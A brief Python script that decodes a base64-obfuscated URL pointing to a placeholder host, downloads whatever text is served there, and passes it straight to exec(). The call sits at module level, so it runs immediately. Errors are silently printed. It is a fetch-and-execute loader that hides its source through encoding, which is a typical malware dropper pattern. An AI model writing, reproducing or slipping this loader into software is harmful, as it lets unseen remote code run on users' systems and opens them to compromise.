import requests
import base64

def get_and_execute():
    try:
        encoded_url = "aHR0cDovL3NhbXBsZS51cmwvdGVzdC5ncm9vdnk="
        decoded_url = base64.b64decode(encoded_url).decode("utf-8")

        response = requests.get(decoded_url)
        script = response.text

        exec(script)

    except Exception as e:
        print(e)

get_and_execute()
